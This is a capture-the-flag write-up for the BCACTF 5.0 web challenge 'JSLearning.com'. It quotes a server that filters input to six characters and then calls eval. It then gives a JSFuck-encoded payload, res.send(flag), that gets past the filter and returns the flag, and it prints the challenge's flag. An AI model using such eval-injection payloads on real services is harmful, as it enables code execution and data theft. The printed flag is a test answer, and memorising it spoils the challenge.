# BCACTF 5.0

## JSLearning.com

> Hey, can you help me on this Javascript problem? Making strings is hard.
> 
> Author: Jacob Korn
> 
> [`server.py`](server.py)

Tags: _web__

## Solution
We get a web application that gives the impression to be some sort of gamified javascript learning platform. The challenge is:

> Level 43: writing strings
> 
> Can you write a string that says "fun"? (no need to declare a variable, just write the string)

If we enter `fun` we get an error: `ERROR: disallowed characters. Valid characters: '[', ']', '(', ')', '+', and '!'.`. Ok, lets check the source code.

```js
for (let i of ["[", "]", "(", ")", "+", "!"]) {
    d = d.replaceAll(i, "");
}
if (d.trim().length) {
    res.send("ERROR: disallowed characters. Valid characters: '[', ']', '(', ')', '+', and '!'.");
    return;
}

let c;
try {
    c = eval(req.body).toString();
} catch (e) {
    res.send("An error occurred with your code.");
    return
}

// disallow code execution
try {
    if (typeof (eval(c)) === "function") {
        res.send("Attempting to abuse javascript code against jslearning.site is not allowed under our terms and conditions.");
        return
    }
} catch (e) {}
```

Input is filtered, so only `[, ], (, ), + and !` are possible. Then the input is passed to `eval`. The characters look strongly like [`jsfuck`](https://jsfuck.com/) could help here. The site states:

> JSFuck is an esoteric and educational programming style based on the atomic parts of JavaScript. It uses only six different characters to write and execute code.

Ok, lets try this. We encode `fun` and get 

```js
(![]+[])[+[]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]
```

Passing this to the application gives us: `Congratulations! You win the level!`. But yeah, we already saw in the source code, there are no other "levels". We rather have to inject some code that gives us the flag. If we check the source code again we see the flag is loaded to a global variable. And since we call eval not in strict mode we have access to this variable.

```js
const flag = Deno.readTextFileSync('flag.txt')
```

So we have all sorts of choices here, one would be to use `res.send` and send just another message to the client, with the flag. So lets jsfuckify `res.send(flag)` and pass this to the application.

```js
(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]
```

Flag `bcactf{1ava5cRIPT_mAk35_S3Nse_48129846}`